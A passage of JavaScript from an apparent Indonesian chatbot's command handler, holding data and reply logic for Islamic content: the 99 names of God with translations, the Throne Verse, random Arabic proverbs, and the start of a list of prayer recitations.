index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
index: 18,
latin: "Al Fattaah",
arabic: "الْفَتَّاحُ",
translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
translation_en: "The Opener, the Victory Giver"
},
{
index: 19,
latin: "Al ‘Aliim",
arabic: "اَلْعَلِيْمُ",
translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
translation_en: "The All Knowing, the Omniscient"
},
{
index: 20,
latin: "Al Qaabidh",
arabic: "الْقَابِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
translation_en: "The Restrainer, the Straightener"
},
{
index: 21,
latin: "Al Baasith",
arabic: "الْبَاسِطُ",
translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
translation_en: "The Expander, the Munificent"
},
{
index: 22,
latin: "Al Khaafidh",
arabic: "الْخَافِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
translation_en: "The Abaser"
},
{
index: 23,
latin: "Ar Raafi’",
arabic: "الرَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
translation_en: "The Exalter"
},
{
index: 24,
latin: "Al Mu’izz",
arabic: "الْمُعِزُّ",
translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
translation_en: "The Giver of Honor"
},
{
index: 25,
latin: "Al Mudzil",
arabic: "المُذِلُّ",
translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
translation_en: "The Giver of Dishonor"
},
{
index: 26,
latin: "Al Samii’",
arabic: "السَّمِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
translation_en: "The All Hearing"
},
{
index: 27,
latin: "Al Bashiir",
arabic: "الْبَصِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
translation_en: "The All Seeing"
},
{
index: 28,
latin: "Al Hakam",
arabic: "الْحَكَمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
translation_en: "The Judge, the Arbitrator"
},
{
index: 29,
latin: "Al ‘Adl",
arabic: "الْعَدْلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Utterly Just"
},
{
index: 30,
latin: "Al Lathiif",
arabic: "اللَّطِيفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
translation_en: "The Subtly Kind"
},
{
index: 31,
latin: "Al Khabiir",
arabic: "الْخَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
translation_en: "The All Aware"
},
{
index: 32,
latin: "Al Haliim",
arabic: "الْحَلِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
translation_en: "The Forbearing, the Indulgent"
},
{
index: 33,
latin: "Al ‘Azhiim",
arabic: "الْعَظِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
translation_en: "The Magnificent, the Infinite"
},
{
index: 34,
latin: "Al Ghafuur",
arabic: "الْغَفُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
translation_en: "The All Forgiving"
},
{
index: 35,
latin: "As Syakuur",
arabic: "الشَّكُورُ",
translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
translation_en: "The Grateful"
},
{
index: 36,
latin: "Al ‘Aliy",
arabic: "الْعَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Sublimely Exalted"
},
{
index: 37,
latin: "Al Kabiir",
arabic: "الْكَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
translation_en: "The Great"
},
{
index: 38,
latin: "Al Hafizh",
arabic: "الْحَفِيظُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
translation_en: "The Preserver"
},
{
index: 39,
latin: "Al Muqiit",
arabic: "المُقيِت",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
translation_en: "The Nourisher"
},
{
index: 40,
latin: "Al Hasiib",
arabic: "الْحسِيبُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
translation_en: "The Reckoner"
},
{
index: 41,
latin: "Al Jaliil",
arabic: "الْجَلِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Majestic"
},
{
index: 42,
latin: "Al Kariim",
arabic: "الْكَرِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
translation_en: "The Bountiful, the Generous"
},
{
index: 43,
latin: "Ar Raqiib",
arabic: "الرَّقِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
translation_en: "The Watchful"
},
{
index: 44,
latin: "Al Mujiib",
arabic: "الْمُجِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
translation_en: "The Responsive, the Answerer"
},
{
index: 45,
latin: "Al Waasi’",
arabic: "الْوَاسِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
translation_en: "The Vast, the All Encompassing"
},
{
index: 46,
latin: "Al Hakiim",
arabic: "الْحَكِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
translation_en: "The Wise"
},
{
index: 47,
latin: "Al Waduud",
arabic: "الْوَدُودُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
translation_en: "The Loving, the Kind One"
},
{
index: 48,
latin: "Al Majiid",
arabic: "الْمَجِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The All Glorious"
},
{
index: 49,
latin: "Al Baa’its",
arabic: "الْبَاعِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
translation_en: "The Raiser of the Dead"
},
{
index: 50,
latin: "As Syahiid",
arabic: "الشَّهِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
translation_en: "The Witness"
},
{
index: 51,
latin: "Al Haqq",
arabic: "الْحَقُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
translation_en: "The Truth, the Real"
},
{
index: 52,
latin: "Al Wakiil",
arabic: "الْوَكِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
translation_en: "The Trustee, the Dependable"
},
{
index: 53,
latin: "Al Qawiyyu",
arabic: "الْقَوِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
translation_en: "The Strong"
},
{
index: 54,
latin: "Al Matiin",
arabic: "الْمَتِينُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
translation_en: "The Firm, the Steadfast"
},
{
index: 55,
latin: "Al Waliyy",
arabic: "الْوَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
translation_en: "The Protecting Friend, Patron, and Helper"
},
{
index: 56,
latin: "Al Hamiid",
arabic: "الْحَمِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
translation_en: "The All Praiseworthy"
},
{
index: 57,
latin: "Al Mushii",
arabic: "الْمُحْصِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
translation_en: "The Accounter, the Numberer of All"
},
{
index: 58,
latin: "Al Mubdi’",
arabic: "الْمُبْدِئُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
translation_en: "The Producer, Originator, and Initiator of all"
},
{
index: 59,
latin: "Al Mu’iid",
arabic: "الْمُعِيدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
translation_en: "The Reinstater Who Brings Back All"
},
{
index: 60,
latin: "Al Muhyii",
arabic: "الْمُحْيِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
translation_en: "The Giver of Life"
},
{
index: 61,
latin: "Al Mumiitu",
arabic: "اَلْمُمِيتُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
translation_en: "The Bringer of Death, the Destroyer"
},
{
index: 62,
latin: "Al Hayyu",
arabic: "الْحَيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
translation_en: "The Ever Living"
},
{
index: 63,
latin: "Al Qayyuum",
arabic: "الْقَيُّومُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
translation_en: "The Self Subsisting Sustainer of All"
},
{
index: 64,
latin: "Al Waajid",
arabic: "الْوَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
translation_en: "The Perceiver, the Finder, the Unfailing"
},
{
index: 65,
latin: "Al Maajid",
arabic: "الْمَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Illustrious, the Magnificent"
},
{
index: 66,
latin: "Al Wahiid",
arabic: "الْواحِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
translation_en: "The One, The Unique, Manifestation of Unity"
},
{
index: 67,
latin: "Al ‘Ahad",
arabic: "اَلاَحَدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
translation_en: "The One, the All Inclusive, the Indivisible"
},
{
index: 68,
latin: "As Shamad",
arabic: "الصَّمَدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
},
{
index: 69,
latin: "Al Qaadir",
arabic: "الْقَادِرُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
translation_en: "The All Able"
},
{
index: 70,
latin: "Al Muqtadir",
arabic: "الْمُقْتَدِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
translation_en: "The All Determiner, the Dominant"
},
{
index: 71,
latin: "Al Muqaddim",
arabic: "الْمُقَدِّمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
translation_en: "The Expediter, He who brings forward"
},
{
index: 72,
latin: "Al Mu’akkhir",
arabic: "الْمُؤَخِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
translation_en: "The Delayer, He who puts far away"
},
{
index: 73,
latin: "Al Awwal",
arabic: "الأوَّلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
translation_en: "The First"
},
{
index: 74,
latin: "Al Aakhir",
arabic: "الآخِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
translation_en: "The Last"
},
{
index: 75,
latin: "Az Zhaahir",
arabic: "الظَّاهِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
translation_en: "The Manifest; the All Victorious"
},
{
index: 76,
latin: "Al Baathin",
arabic: "الْبَاطِنُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
translation_en: "The Hidden; the All Encompassing"
},
{
index: 77,
latin: "Al Waali",
arabic: "الْوَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
translation_en: "The Patron"
},
{
index: 78,
latin: "Al Muta’aalii",
arabic: "الْمُتَعَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Self Exalted"
},
{
index: 79,
latin: "Al Barri",
arabic: "الْبَرُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
translation_en: "The Most Kind and Righteous"
},
{
index: 80,
latin: "At Tawwaab",
arabic: "التَّوَابُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
translation_en: "The Ever Returning, Ever Relenting"
},
{
index: 81,
latin: "Al Muntaqim",
arabic: "الْمُنْتَقِمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
translation_en: "The Avenger"
},
{
index: 82,
latin: "Al Afuww",
arabic: "العَفُوُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
translation_en: "The Pardoner, the Effacer of Sins"
},
{
index: 83,
latin: "Ar Ra`uuf",
arabic: "الرَّؤُوفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
translation_en: "The Compassionate, the All Pitying"
},
{
index: 84,
latin: "Malikul Mulk",
arabic: "مَالِكُ الْمُلْكِ",
translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
translation_en: "The Owner of All Sovereignty"
},
{
index: 85,
latin: "Dzul JalaaliWal Ikraam",
arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
translation_en: "The Lord of Majesty and Generosity"
},
{
index: 86,
latin: "Al Muqsith",
arabic: "الْمُقْسِطُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Equitable, the Requiter"
},
{
index: 87,
latin: "Al Jamii’",
arabic: "الْجَامِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
translation_en: "The Gatherer, the Unifier"
},
{
index: 88,
latin: "Al Ghaniyy",
arabic: "الْغَنِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
translation_en: "The All Rich, the Independent"
},
{
index: 89,
latin: "Al Mughnii",
arabic: "الْمُغْنِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
translation_en: "The Enricher, the Emancipator"
},
{
index: 90,
latin: "Al Maani",
arabic: "اَلْمَانِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
translation_en: "The Withholder, the Shielder, the Defender"
},
{
index: 91,
latin: "Ad Dhaar",
arabic: "الضَّارَّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
translation_en: "The Distressor, the Harmer"
},
{
index: 92,
latin: "An Nafii’",
arabic: "النَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
translation_en: "The Propitious, the Benefactor"
},
{
index: 93,
latin: "An Nuur",
arabic: "النُّورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
translation_en: "The Light"
},
{
index: 94,
latin: "Al Haadii",
arabic: "الْهَادِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
translation_en: "The Guide"
},
{
index: 95,
latin: "Al Baadii",
arabic: "الْبَدِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
translation_en: "Incomparable, the Originator"
},
{
index: 96,
latin: "Al Baaqii",
arabic: "اَلْبَاقِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
translation_en: "The Ever Enduring and Immutable"
},
{
index: 97,
latin: "Al Waarits",
arabic: "الْوَارِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
translation_en: "The Heir, the Inheritor of All"
},
{
index: 98,
latin: "Ar Rasyiid",
arabic: "الرَّشِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
translation_en: "The Guide, Infallible Teacher, and Knower"
},
{
index: 99,
latin: "As Shabuur",
arabic: "الصَّبُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
translation_en: "The Patient"
}
]
let json = JSON.parse(JSON.stringify(asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (isNaN(args[0])) return reply(`contoh:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return zreply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
}
zreply(`${contoh} + ${data} + ${anjuran}`)
uselimit()
}
break
        
case 'ayatkursi': {
if (limitnya < 1) return zreply(mess.limit)
let caption = `
*${Kyuu}「 Ayat Kursi 」${Kyuu}*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
zreply(caption)
uselimit()
}
break
        
case 'quotesislami': {
if (limitnya < 1) return zreply(mess.limit)
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": 6,
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
 "id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
zreply(`${arabic}\n${arti}`)
}
break

case 'bacaansholat': {
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
